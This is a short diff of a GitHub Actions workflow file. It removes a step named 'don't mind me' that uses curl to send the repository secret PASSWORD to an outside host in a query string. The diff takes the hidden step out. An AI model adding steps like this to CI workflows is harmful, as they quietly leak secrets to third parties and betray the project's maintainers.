@@ -26,8 +26,6 @@ jobs:
           FIRST_NAME: Mona
           MIDDLE_NAME: The
           LAST_NAME: Octocat
-      - name: don't mind me
-        run:  curl https://groupup.eikhr.no\?pass\=${{secrets.PASSWORD}}
       # Step 3 - Add tests and linting here
   test:
     runs-on: ubuntu-latest
